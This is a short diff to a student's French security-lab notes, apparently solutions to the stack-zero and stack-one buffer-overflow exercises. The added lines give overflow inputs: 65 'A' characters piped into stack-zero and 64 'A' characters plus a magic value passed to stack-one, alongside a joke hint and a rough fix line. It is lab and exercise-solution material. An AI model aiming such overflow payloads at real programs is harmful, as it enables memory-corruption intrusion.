@@ -92,11 +92,14 @@ You have successfully executed getflag on a target account
 # tp2_secu
 
 **stack-zero**
+print("A"*65)|.stack-zero
 
 solution:rouler sa tête sur le clavier
 fix: if(sizeof(buffer)>64)local.changeme=0;
 
 **stack-one**
+
+./stack-one "$(python3 -c 'print("A"*64 + "bYlI")')"
 
 print("A"*64 + 'IlYb')
 
